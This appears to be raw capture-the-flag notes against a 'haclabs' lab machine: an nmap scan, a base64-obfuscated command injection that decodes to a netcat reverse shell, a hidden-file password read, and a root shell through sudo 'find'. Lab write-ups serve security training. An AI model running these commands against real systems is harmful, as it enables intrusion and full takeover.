@@ -1,0 +1,83 @@
+
+hack@kali:~$ nmap -A -p- 192.168.1.6
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-28 11:30 CET
+Nmap scan report for haclabs.homenet.telecomitalia.it (192.168.1.6)
+Host is up (0.00098s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)                                                       
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).                                
+                                                                                                   
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .     
+Nmap done: 1 IP address (1 host up) scanned in 22.63 seconds   
+
+
+ping 127.0.0.1 | `echo "bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMS43MiAxMjM0" | base64 -d`
+
+
+<!--passphrase:harder-->
+
+
+
+
+www-data@haclabs:/home/yash$ cat flag1.txt
+cat flag1.txt
+Due to some security issues,I have saved haclabs password in a hidden file.
+
+
+Pass found in file:
+/usr/share/hidden/.passwd
+
+
+www-data@haclabs:/usr/share/hidden$ cat .passwd
+cat .passwd
+haclabs1234
+
+
+haclabs@haclabs:~$ cat flag2.txt
+cat flag2.txt
+I am flag2 
+
+           ---------------               ----------------
+                         
+                     
+                               --------
+
+
+
+
+haclabs@haclabs:~$ sudo -l
+sudo -l
+Matching Defaults entries for haclabs on haclabs:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User haclabs may run the following commands on haclabs:
+    (root) NOPASSWD: /usr/bin/find
+haclabs@haclabs:~$ 
+
+haclabs@haclabs:~$ sudo find . -exec /bin/sh \; -quit
+sudo find . -exec /bin/sh \; -quit
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+cd /root
+# ls
+ls
+flag3.txt
+# cat flag3.txt
+cat flag3.txt
+Congrats!!!You completed the challenege!
+
+
+
+                                                   ()    ()
+
+                                                 \          /
+                                                  ----------
+# 
+
+
+
